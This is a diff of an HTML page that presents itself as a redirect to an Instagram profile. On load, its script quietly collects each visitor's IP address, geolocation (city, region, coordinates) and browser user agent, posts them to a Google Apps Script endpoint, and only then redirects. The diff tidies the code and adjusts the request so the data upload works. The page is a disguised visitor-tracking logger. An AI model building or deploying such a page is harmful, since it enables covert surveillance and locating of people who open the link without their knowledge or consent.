@@ -1,53 +1,64 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8">
+<head>
+  <meta charset="UTF-8">
   <title>正在跳轉中...</title>
-  <style>#map { height: 200px; width: 100%; margin-bottom: 10px; }</style>
+  <style>
+    #map { height: 200px; width: 100%; margin-bottom: 10px; }
+  </style>
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
 </head>
 <body>
   <p>正在跳轉到 IG</p>
   <div id="map"></div>
+
   <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
   <script>
-  (async () => {
-    try {
-      const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
-      const ua = navigator.userAgent;
+    (async () => {
+      try {
+        const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
+        const ua = navigator.userAgent;
 
-      let country="",region="",city="",lat=0,lon=0;
-      const locRes = await fetch(`http://ip-api.com/json/${ip}`);
-      const locData = await locRes.json();
-      if (locData.status === "success") {
-        country=locData.country;
-        region=locData.regionName;
-        city=locData.city;
-        lat=locData.lat;
-        lon=locData.lon;
+        let country = "", region = "", city = "", lat = 0, lon = 0;
+        // ✅ 修正 HTTP -> HTTPS 避免被封鎖
+        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        const locData = await locRes.json();
+
+        if (locData.status === "success") {
+          country = locData.country;
+          region = locData.regionName;
+          city = locData.city;
+          lat = locData.lat;
+          lon = locData.lon;
+        }
+
+        // ✅ 替換成你的 Google Apps Script Web App URL
+        await fetch("https://script.google.com/macros/s/AKfycbyYKeXg-KLxCvet0aM95lqJNYLH7O8hZpqbJ2M8O7xrRAAUoSUMFdBUvI3SSL-MSgMm/exec", {
+          method: "POST",
+          headers: { "Content-Type": "text/plain;charset=utf-8" },
+          body: JSON.stringify({ ip, country, region, city, lat, lon, ua })
+        });
+
+        // 顯示地圖位置
+        if (lat && lon) {
+          const map = L.map('map').setView([lat, lon], 8);
+          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; OpenStreetMap contributors'
+          }).addTo(map);
+          L.marker([lat, lon]).addTo(map)
+            .bindPopup(`${city}, ${region}, ${country}`)
+            .openPopup();
+        }
+
+      } catch (e) {
+        console.error(e);
+      } finally {
+        // 跳轉 IG App（或改回 IG 網頁）
+        window.location.replace("instagram://user?username=_1naux.1");
+        // 或跳轉到 IG 網頁：
+        // window.location.href = "https://www.instagram.com/_1naux.1?igsh=MXBsOWlmNzI0bWpiOA==&utm_source=qr";
       }
-
-      fetch("https://script.google.com/macros/s/AKfycbyYKeXg-KLxCvet0aM95lqJNYLH7O8hZpqbJ2M8O7xrRAAUoSUMFdBUvI3SSL-MSgMm/exec", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },  
-      body: JSON.stringify({ ip, country, region, city, lat, lon, ua })
-      });
-
-      if (lat && lon) {
-        const map = L.map('map').setView([lat, lon], 8);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-          attribution: '&copy; OpenStreetMap contributors'
-        }).addTo(map);
-        L.marker([lat, lon]).addTo(map)
-          .bindPopup(`${city}, ${region}, ${country}`)
-          .openPopup();
-      }
-
-    } catch(e) {
-      console.error(e);
-    } finally {
-      window.location.replace("instagram://user?username=_1naux.1");
-    }
-  })();
+    })();
   </script>
 </body>
 </html>
